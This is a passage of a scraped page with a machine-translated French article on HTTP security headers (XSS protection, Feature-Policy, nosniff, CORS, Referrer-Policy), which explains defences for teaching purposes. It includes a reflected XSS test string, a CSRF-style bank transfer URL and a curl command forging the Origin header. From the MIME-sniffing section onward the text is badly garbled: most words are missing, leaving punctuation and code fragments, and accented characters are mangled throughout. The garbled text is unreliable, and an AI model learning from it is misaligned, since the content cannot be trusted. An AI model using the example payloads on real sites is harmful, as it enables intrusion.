report=http://xssviolations.example.com/collector</code> </pre> <br>  Reflected XSS est le type d'attaque le plus courant lorsque le texte saisi est imprim√© par le serveur sans aucune v√©rification, et c'est l√† que cet en-t√™te r√©sout vraiment.  Si vous voulez le voir par vous-m√™me, je vous recommande d'essayer l'exemple sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/xss</a> , car en ajoutant <code>xss=on</code> √† l'URL, il montre ce que fait le navigateur lorsque la protection XSS est activ√©e .  Si nous entrons une cha√Æne malveillante dans le champ de recherche, par exemple, le navigateur refuse poliment d'ex√©cuter le script et explique la raison de sa d√©cision: <br><br><pre> <code class="plaintext hljs">The XSS Auditor refused to execute a script in 'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on' because its source code was found within the request. The server sent an 'X-XSS-Protection' header requesting this behavior.</code> </pre> <br>  Encore plus int√©ressant est le comportement par d√©faut dans Chrome lorsqu'une strat√©gie CSP ou XSS n'est pas sp√©cifi√©e sur une page Web.  Un script que nous pouvons tester en ajoutant le param√®tre <code>xss=off</code> √† notre URL ( <code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code> ): <br><br><img src="https://habrastorage.org/getpro/habr/post_images/938/8c4/6fd/9388c46fd9f6c9370d0f9ff3b2a65210.png" alt="image"><br><br>  √âtonnamment, Chrome est suffisamment prudent pour emp√™cher le rendu des pages, ce qui rend difficile la cr√©ation de XSS en miroir.  Impressionnant jusqu'o√π les navigateurs sont all√©s. <br><br><h3>  Politique de fonctionnalit√© </h3><br>  En juillet 2018, le chercheur en s√©curit√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Scott Helm a</a> publi√© un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">article de blog</a> tr√®s int√©ressant d√©taillant le nouveau titre de s√©curit√©: <code>Feature-Policy</code> . <br><br>  Actuellement pris en charge par tr√®s peu de navigateurs (Chrome et Safari au moment de la r√©daction de cet article), cet en-t√™te nous permet de d√©terminer si une fonctionnalit√© de navigateur particuli√®re est activ√©e sur la page actuelle.  Avec une syntaxe tr√®s similaire √† CSP, nous ne devrions avoir aucun probl√®me √† comprendre ce que les politiques de fonction signifient, telles que les suivantes: <br><br><pre> <code class="plaintext hljs">Feature-Policy: vibrate 'self'; push *; camera 'none'</code> </pre> <br>  Si nous avons tous des doutes, comment cette politique affecte l'API du navigateur, nous pouvons simplement l'analyser: <br><br><ul><li>  <code>vibrate 'self'</code> : permet √† la page actuelle d'utiliser l'API de vibration et n'importe quel cadre du site actuel. </li><li>  <code>push *</code> : la page en cours et n'importe quel cadre peuvent utiliser l'API de notification push </li><li>  <code>camera 'none'</code> : l'acc√®s √† l'API de la cam√©ra est refus√© sur cette page et sur les cadres </li></ul><br>  La politique des fonctionnalit√©s a un peu d'histoire.  Si votre site permet aux utilisateurs, par exemple, de prendre des selfies ou d'enregistrer de l'audio, il serait tr√®s utile d'utiliser une politique qui restreint l'acc√®s √† l'API via votre page dans d'autres contextes. <br><br><h3>  Options de type de contenu X </h3><br>  Parfois, les fonctionnalit√©s du navigateur intelligent finissent par nous nuire en termes de s√©curit√©.  Un exemple parfait est le reniflement MIME, une technique populaire dans Internet Explorer. <br><br> MIME- ‚Äî       ( )    . ,      <code>/awesome-picture.png</code> ,          (, <code>Content-Type: text/plain</code> ).     ,       . <br><br>    , IE   ,    MIME-:     ¬´¬ª  ,  ,      ,      <code>Content-Type</code> ,   ,  ,       ,  . <br><br>     -,       ,  ,     <code>/test.jpg</code> ,   JavaScript. ,   ?    ,       HTML ,     ,   ¬´¬ª,     .    ,  ,   ,      . <br><br>    ,     <code>X-Content-Type-Options: nosniff</code> ,    MIME-:     ,   ,           ,       .  ,   ,       ,       . <br><br><h3> Cross-Origin Resource Sharing (CORS) </h3><br>    JavaScript HTTP-      .  , AJAX-  <code>example.com</code>     <code>example.com</code> . <br><br>    ,         ‚Äî  cookie,       . ,       <code>win-a-hummer.com</code> ,     AJAX  <code>your-bank.com</code> .     - ,    HTTP-    ,    ,   ,    . <br><br>         AJAX   ,        Cross Origin Resource Sharing (CORS),  ,     . <br><br> ,    CORS,  ,        ,     ¬´¬ª  CORS. <br><br> ,       ,  ,     <code>Access-Control-Allow-Origin</code>    , ,       . <br><br>       <code>Access-Control-Allow-Origin: *</code> ,         ,     ,   URL-,       ,   <code>Access-Control-Allow-Origin: https://example.com</code> . <br><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/cors</a> ,  ,         .   ,    AJAX  <code>test-cors</code>  <code>test-cors-2</code>      .   test-cors-2    CORS,   ,   .    <code>http://cors-test:7888/?cors=on</code> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bae/c57/e2f/baec57e2f48c17748ce2d6202985c559.png" alt="image"><br><br>      <code>cors</code>  URL,         : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/68d/3aa/ae1/68d3aaae10cb6f226ae1c0a1c9a96d27.png" alt="image"><br><br>  ,    ,   ,    ,        .   ,        ,          . , ,       ,    <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker.</code>    ! <br><br>       , <code>GET</code> -   ,   ,     <code>POST</code> -?  ,      ,     ,    <code>http://cors-test:7888/?method=POST</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e73/f4e/9a0/e73f4e9a003a2cb60cf6c952bc8d21e6.png" alt="image"><br><br>      <code>POST</code> ,        ,    ¬´ ¬ª.    ,   <code>OPTIONS</code>     ,    .       ,    ,    <code>POST</code>    . <br><br>     : <br><br><ul><li> CORS ‚Äî    .   ,     ,         ,   . </li><li>    API,     <code>GET</code> .        ,     . </li></ul><br>    ,        -,       ,    ,     CORS.  ,   ,   <code>example.com</code> ,     <code>example.com/_proxy/other.com</code> ,    ,   <code>_proxy/other.com/*</code> ,    <code>other.com</code> . <br><br>       , ,       CORS,  MDN    ,       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a> . <br><br><h3> X-Permitted-Cross-Domain-Policies </h3><br>    CORS, <code>X-Permitted-Cross-Domain-Policies</code>       Adobe ( , Flash  Acrobat). <br><br>      ,    ,      .  ,  Adobe      <code>crossdomain.xml</code>    ,    ,  <code>X-Permitted-Cross-Domain-Policies</code>       . <br><br>  ?      <code>X-Permitted-Cross-Domain-Policies: none</code>   ,       Flash. <br><br><h3> Referrer-Policy </h3><br>      , ,      .   <code>Referer</code> ,       .     URL     ,   . <br><br> ,  ,      .    ,     .   <code>Referer</code>        .    ,    ,              . <br><br>  <code>Referrer-Policy</code> ,    2017         ,        ,  ,      URL-   <code>Referer</code>     . <br><br>      ,    <code>Referrer-Policy</code> : <br><br><ul><li> <code>no-referrer</code> :  <code>Referer</code>    </li><li> <code>origin</code> :  <code>https://example.com/private-page</code>  <code>https://example.com/</code> </li><li> <code>same-origin</code> :  <code>Referer</code>    ,       </li></ul><br>  ,      <code>Referred-Policy</code> ( <code>strict-origin</code> , <code>no-referrer-when-downgrade</code>  . .),  ,    , ,      .       ,    ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">     OWASP</a> . <br><br>  <code>Origin</code>    <code>Referer</code> ,        ,  ,          .  <code>Origin</code>  ,       .             -:  <code>Origin</code>     ,   . <br><br>   ,   HTTP-,   cURL,     :  c <code>url -H "Origin: example.com" api.example.com</code>        origin ‚Ä¶‚Ä¶         <code>Origin</code> ( <code>Referer</code> ,     )        . <br><br><h3>    </h3><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">securityheaders.com</a> ,   -,    ,    -   ,   .  ,    URL,         .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://securityheaders.com/%3Fq%3D">   facebook.com</a> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8dd/8ef/5a6/8dd8ef5a6215f292b95bfae1b9c8ef16.png" alt="image"><br><br>     ,   , securityheaders.com ‚Äî  ,    . <br><br><h3> HTTP   :     cookie </h3><br>           HTTP,     ,     -      ,       . <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://medium.freecodecamp.org/web-security-hardening-"> </a>           HTTP: . <br><br>   ,   -   HTTP   , , ,  ( )         -:     - ,     ,     ¬´   ¬ª.   ,  cookie       ,           . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr434228/">https://habr.com/ru/post/fr434228/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr434216/index.html">Attaques par force brute avec Kali Linux</a></li>
<li><a href="../fr434218/index.html">Bot clicker Java simple sur l'exemple du jeu World of Warcraft 3.3.5a</a></li>
<li><a href="../fr434220/index.html">Entr√©e dans Aeronet: lancement d'un quadricopt√®re autonome dans un environnement virtuel</a></li>
<li><a href="../fr434222/index.html">Station au sol Amazon √† louer - recevez et traitez les donn√©es des satellites</a></li>
<li><a href="../fr434224/index.html">√âv√©nements num√©riques √† Moscou du 24 au 30 d√©cembre</a></li>
<li><a href="../fr434230/index.html">Pr√©sentation des scanners 3D GOM Atos 5 / 5X au Top 3D Expo</a></li>
<li><a href="../fr434234/index.html">M√©thode des couloirs de natation</a></li>
<li><a href="../fr434236/index.html">Le r√©seau neuronal avec une amibe a r√©solu le probl√®me des vendeurs ambulants pour 8 villes</a></li>
<li><a href="../fr434238/index.html">Intel OpenVINO sur Raspberry Pi: r√©colte 2018</a></li>
<li><a href="../fr434244/index.html">Je suis le marchand d'algo de maman: √† la recherche de frameworks gratuits pour tester des hypoth√®ses et lancer en mode bataille (Python)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>